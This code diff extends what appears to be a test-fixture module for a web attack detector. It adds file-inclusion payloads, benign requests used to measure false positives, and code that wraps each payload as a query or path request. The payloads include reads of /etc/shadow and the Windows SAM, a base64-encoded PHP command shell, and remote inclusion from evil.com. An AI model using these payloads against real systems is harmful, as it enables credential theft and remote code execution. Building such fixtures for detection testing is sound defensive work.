@@ -197,6 +197,30 @@ TEMPLATE_INJECTION_PAYLOADS = [
     "#{jndi:ldap://evil.com/a}",
 ]
 
+# File Inclusion Payloads (LFI/RFI)
+FILE_INCLUSION_PAYLOADS = [
+    "php://filter/read=string.rot13/resource=index.php",
+    "php://input",
+    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==",
+    "expect://whoami",
+    "file:///etc/passwd",
+    "file:///C:/Windows/System32/config/sam",
+    "http://evil.com/shell.php",
+    "ftp://evil.com/shell.php",
+    "zip://shell.php#shell",
+    "phar://shell.php",
+    "php://filter/convert.base64-encode/resource=index.php",
+    "php://filter/read=convert.base64-encode/resource=/etc/passwd",
+    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
+    "expect://ls",
+    "file:///etc/shadow",
+    "file:///proc/self/environ",
+    "http://127.0.0.1/shell.php",
+    "ftp://127.0.0.1/shell.php",
+    "zip:///var/www/html/shell.zip#shell.php",
+    "phar:///var/www/html/shell.phar",
+]
+
 
 def get_all_malicious_payloads() -> Dict[str, List[str]]:
     """Get all malicious payloads organized by category"""
@@ -205,6 +229,7 @@ def get_all_malicious_payloads() -> Dict[str, List[str]]:
         'xss': XSS_PAYLOADS,
         'path_traversal': PATH_TRAVERSAL_PAYLOADS,
         'command_injection': COMMAND_INJECTION_PAYLOADS,
+        'file_inclusion': FILE_INCLUSION_PAYLOADS,
         'rce': RCE_PAYLOADS,
         'xxe': XXE_PAYLOADS,
         'ssrf': SSRF_PAYLOADS,
@@ -256,3 +281,43 @@ def get_payload_count() -> int:
     """Get total number of malicious payloads"""
     all_payloads = get_all_malicious_payloads()
     return sum(len(payloads) for payloads in all_payloads.values())
+
+
+# Benign requests for testing false positive rate
+BENIGN_REQUESTS = [
+    {"method": "GET", "path": "/", "query_params": {}, "headers": {}, "body": None},
+    {"method": "GET", "path": "/api/users", "query_params": {}, "headers": {}, "body": None},
+    {"method": "GET", "path": "/dashboard", "query_params": {"page": "1"}, "headers": {}, "body": None},
+    {"method": "POST", "path": "/api/login", "query_params": {}, "headers": {"Content-Type": "application/json"}, "body": '{"username":"user","password":"pass"}'},
+    {"method": "GET", "path": "/products", "query_params": {"category": "electronics"}, "headers": {}, "body": None},
+    {"method": "GET", "path": "/api/data", "query_params": {"limit": "10", "offset": "0"}, "headers": {}, "body": None},
+    {"method": "POST", "path": "/api/register", "query_params": {}, "headers": {"Content-Type": "application/json"}, "body": '{"email":"user@example.com","name":"User"}'},
+    {"method": "GET", "path": "/about", "query_params": {}, "headers": {}, "body": None},
+    {"method": "GET", "path": "/contact", "query_params": {}, "headers": {}, "body": None},
+    {"method": "GET", "path": "/api/status", "query_params": {}, "headers": {}, "body": None},
+]
+
+
+# Convert malicious payloads to request format
+MALICIOUS_PAYLOADS = []
+all_payloads_dict = get_all_malicious_payloads()
+
+for category, payloads in all_payloads_dict.items():
+    for payload in payloads[:5]:  # Limit to 5 per category for testing
+        # In query parameter
+        MALICIOUS_PAYLOADS.append({
+            "method": "GET",
+            "path": "/api/data",
+            "query_params": {"id": payload},
+            "headers": {},
+            "body": None
+        })
+        # In path
+        if len(payload) < 50:
+            MALICIOUS_PAYLOADS.append({
+                "method": "GET",
+                "path": f"/api/data/{payload}",
+                "query_params": {},
+                "headers": {},
+                "body": None
+            })
